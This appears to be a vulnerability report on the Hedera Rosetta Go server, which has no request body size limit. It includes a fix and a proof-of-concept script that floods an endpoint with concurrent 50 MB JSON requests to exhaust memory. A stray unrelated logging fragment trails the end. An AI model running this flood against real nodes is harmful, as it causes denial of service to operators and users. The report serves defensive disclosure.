### Title
Unbounded Request Body Size Allows Memory Exhaustion via Large JSON POST Bodies

### Summary
The `http.Server` in `rosetta/main.go` is configured with only time-based read timeouts and no body size limit (`http.MaxBytesReader`). Any unauthenticated external user can POST arbitrarily large JSON bodies to any Rosetta endpoint, causing the Go HTTP server's JSON decoder to allocate memory proportional to the body size. Flooding the server with concurrent oversized requests can drive memory consumption well above 30% of the 24-hour baseline.

### Finding Description
**Exact code path:** `rosetta/main.go`, `main()`, lines 220–227.

```go
httpServer := &http.Server{
    Addr:              fmt.Sprintf(":%d", rosettaConfig.Port),
    Handler:           corsMiddleware,
    IdleTimeout:       rosettaConfig.Http.IdleTimeout,
    ReadHeaderTimeout: rosettaConfig.Http.ReadHeaderTimeout,
    ReadTimeout:       rosettaConfig.Http.ReadTimeout,   // 5 s default
    WriteTimeout:      rosettaConfig.Http.WriteTimeout,
}
``` [1](#0-0) 

The `Http` config struct (`rosetta/app/config/types.go` lines 64–69) exposes only time-duration fields; there is no `MaxBodySize` or equivalent field. [2](#0-1) 

A grep across all `rosetta/**/*.go` for `MaxBytesReader`, `LimitReader`, `maxBodySize`, or `body.*limit` returns **zero matches**. None of the three middleware layers (`MetricsMiddleware`, `TracingMiddleware`, `CorsMiddleware`) apply any body size cap. [3](#0-2) [4](#0-3) 

**Root cause / failed assumption:** The developer assumed `ReadTimeout` (5 s) is sufficient to bound resource consumption. It is not: `ReadTimeout` is a *wall-clock* limit, not a *byte* limit. On a 100 Mbps link an attacker can deliver ~62 MB within the 5-second window; on a 1 Gbps link ~625 MB. The rosetta-sdk-go controller reads the entire body via `json.Decode(r.Body)`, allocating memory equal to the body size before any application-level validation occurs.

### Impact Explanation
Each concurrent POST connection with a large body causes a heap allocation proportional to the body size. With the default `maxOpenConnections = 100` for the DB and Go's ability to handle thousands of concurrent HTTP connections, an attacker can sustain dozens of simultaneous large-body requests. Even at 10 concurrent 50 MB bodies the server allocates ~500 MB of additional heap, easily exceeding a 30% memory increase over a typical idle baseline. Sustained attack causes OOM pressure, GC thrashing, and potential process termination, constituting a denial-of-service against the Rosetta node. [5](#0-4) 

### Likelihood Explanation
The Rosetta API is a public-facing HTTP service (default port 5700) with no authentication requirement — all POST endpoints are reachable by any network peer. The attack requires only a standard HTTP client and the ability to send large request bodies. It is trivially scriptable, repeatable, and requires no special knowledge of the application beyond the publicly documented Rosetta API specification. The Kubernetes Helm chart does configure a Traefik `inFlightReq` limit of 5 per IP and a rate limit of 10 req/s, but these are optional infrastructure-level controls (`middleware.enabled: false` by default in the chart) and are not enforced at the application layer. [6](#0-5) 

### Recommendation
Wrap `r.Body` with `http.MaxBytesReader` in a middleware applied before the router, e.g.:

```go
func MaxBodySizeMiddleware(next http.Handler, limit int64) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        r.Body = http.MaxBytesReader(w, r.Body, limit)
        next.ServeHTTP(w, r)
    })
}
```

Apply it in `main()` between the router and the existing middleware chain, with a conservative limit (e.g., 1 MB for Rosetta JSON payloads). Additionally, add a `MaxBodySize` field to the `Http` config struct so the limit is operator-configurable. [7](#0-6) [2](#0-1) 

### Proof of Concept
```bash
# Generate a ~50 MB JSON body (valid Rosetta envelope with a large metadata field)
python3 -c "
import json, sys
payload = {
  'network_identifier': {'blockchain': 'Hedera', 'network': 'mainnet'},
  'metadata': {'padding': 'A' * 50_000_000}
}
sys.stdout.write(json.dumps(payload))
" > large_body.json

# Send 20 concurrent requests to the /network/status endpoint
for i in $(seq 1 20); do
  curl -s -o /dev/null -X POST http://<rosetta-host>:5700/network/status \
       -H 'Content-Type: application/json' \
       --data-binary @large_body.json &
done
wait

# Observe memory spike via /metrics or process RSS
curl -s http://<rosetta-host>:5700/metrics | grep go_memstats_heap_inuse_bytes
```

Expected result: heap in-use bytes increase by several hundred MB compared to the pre-attack baseline, exceeding the 30% threshold. Each request completes or times out within 5 seconds, but the concurrent heap allocations persist for the duration of JSON decoding across all goroutines.

			log.Debug(message)
		} else {
			log.Info(message)
		}
	})
